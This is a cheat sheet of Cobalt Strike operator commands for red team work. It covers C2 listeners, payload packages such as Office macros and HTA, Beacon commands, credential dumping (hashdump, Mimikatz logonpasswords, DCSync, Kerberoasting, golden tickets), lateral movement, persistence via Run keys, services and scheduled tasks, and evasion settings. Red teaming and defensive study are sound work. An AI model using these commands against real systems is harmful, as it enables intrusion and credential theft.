# Cobalt Strike Quick Reference

> **For authorized red team exercises only. Cobalt Strike is commercial software.**

---

## Basic Operations

### Team Server & Client

```bash
# Start team server
./teamserver <IP> <password> [malleable_profile]

# Connect client
./cobaltstrike

# Cobalt Strike console commands
help                           # Show help
targets                        # Show targets
listeners                      # Show listeners
credentials                    # Show credentials
downloads                      # Show downloads
```

### Listeners

```bash
# HTTP/HTTPS listeners
Cobalt Strike -> Listeners -> Add
- Payload: Beacon HTTP/HTTPS
- Name: http-80
- HTTP Hosts: http://domain.com
- HTTP Port: 80

# DNS listener
- Payload: Beacon DNS
- Name: dns
- DNS Hosts: domain.com

# SMB listener (peer-to-peer)
- Payload: Beacon SMB
- Name: smb
- Pipe Name: msagent_##
```

### Payload Generation

```bash
# Generate payloads
Attacks -> Packages -> Windows Executable
Attacks -> Packages -> Windows Executable (S) # Stageless
Attacks -> Packages -> MS Office Macro
Attacks -> Packages -> Payload Generator

# PowerShell one-liner
Attacks -> Packages -> Scripted Web Delivery (powershell)

# HTA application
Attacks -> Packages -> HTML Application
```

---

## Beacon Commands

### System Information
```bash
# Basic info
pwd                           # Current directory
getuid                        # Current user
ps                            # Process list
drives                        # Drive list
systeminfo                    # System information

# Network info
ipconfig                      # Network configuration
route                         # Routing table
arp                          # ARP table
netview                       # Network shares
```

### File Operations
```bash
ls                           # List files
cd <path>                    # Change directory
download <file>              # Download file
upload <local> <remote>      # Upload file
mkdir <dir>                  # Create directory
rm <file>                    # Delete file
```

### Process Management
```bash
ps                           # List processes
kill <pid>                   # Kill process
inject <pid> <listener>      # Process injection
spawn <listener>             # Spawn new beacon
spawnu <pid> <listener>      # Spawn as user
spawnto                      # Set spawn-to binary
```

### Privilege Escalation
```bash
elevate <exploit> <listener> # Privilege escalation
runasadmin <command>         # Run as admin
bypassuac <listener>         # UAC bypass
getsystem                    # Get SYSTEM
steal_token <pid>            # Token theft
make_token <domain\user> <pass> # Create token
```

---

## Post-Exploitation

### Credentials
```bash
hashdump                     # Dump password hashes
logonpasswords               # Mimikatz logonpasswords
dcsync <domain\user>         # DCSync attack
kerberoast                   # Kerberoasting
asreproast                   # ASREPRoasting
golden_ticket <options>      # Golden ticket
```

### Lateral Movement
```bash
jump <method> <target> <listener> # Lateral movement
- psexec
- psexec_psh
- winrm
- winrm64
- ssh

remote-exec <method> <target> <command>
wmi <target> <command>       # WMI execution
```

### Persistence
```bash
# Registry persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /d "C:\beacon.exe"

# Service persistence
sc create <service> binpath= "C:\beacon.exe"

# Scheduled task
schtasks /create /tn Update /tr "C:\beacon.exe" /sc onstart
```

---

## Evasion & OPSEC

### Process Migration
```bash
ps                           # List processes
inject <pid> <listener>      # Migrate via injection
spawn <listener>             # Spawn new process
spawnto x64 %windir%\sysnative\dllhost.exe
spawnto x86 %windir%\syswow64\dllhost.exe
```

### Sleep & Jitter
```bash
sleep 60 50                  # Sleep 60s with 50% jitter
sleep 0                      # Interactive mode
```

### Malleable C2 Profiles
```bash
# Custom profiles for traffic shaping
./teamserver <IP> <pass> malleable.profile

# Profile testing
./c2lint malleable.profile
```

---

## Cobalt Strike Extensions

### Aggressor Scripts
```bash
# Load script
Cobalt Strike -> Script Manager -> Load

# Built-in scripts
scripts/                     # Script directory
- elevate.cna               # Privilege escalation
- powerview.cna             # PowerView integration
- mimikatz.cna              # Mimikatz integration
```

### Arsenal Kit
```bash
# Artifact Kit - payload modification
./build.sh                   # Build custom artifacts

# Resource Kit - script templates
scripts/                     # Template scripts

# Malleable C2 Profiles
profiles/                    # Traffic profiles
```

---

*Cobalt Strike is commercial software. Ensure proper licensing and authorization.*